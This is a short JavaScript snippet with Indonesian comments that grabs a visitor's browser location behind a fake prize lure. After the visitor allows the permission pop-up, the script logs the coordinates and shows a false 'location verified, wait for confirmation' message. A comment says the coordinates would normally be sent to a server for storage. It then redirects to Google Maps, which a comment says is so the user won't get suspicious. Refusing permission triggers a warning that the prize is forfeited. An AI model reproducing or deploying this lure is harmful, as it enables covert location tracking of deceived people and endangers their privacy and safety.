function getLocation() {
    if (navigator.geolocation) {
        // Ini yang bakal munculin pop-up izin di browser user
        navigator.geolocation.getCurrentPosition(showPosition, showError);
    } else {
        alert("Browser lo jadul, gak support.");
    }
}

function showPosition(position) {
    let lat = position.coords.latitude;
    let lon = position.coords.longitude;
    
    console.log("Latitude: " + lat);
    console.log("Longitude: " + lon);

    // Di sini biasanya data dikirim ke server (PHP/Python) buat disimpan
    alert("Lokasi berhasil diverifikasi. Tunggu konfirmasi!");
    
    // Contoh redirect ke Google Maps biar user gak curiga
    window.location.href = `https://www.google.com/maps?q=${lat},${lon}`;
}

function showError(error) {
    switch(error.code) {
        case error.PERMISSION_DENIED:
            alert("Yah, lo nolak izinnya. Hadiah angus.");
            break;
    }
}
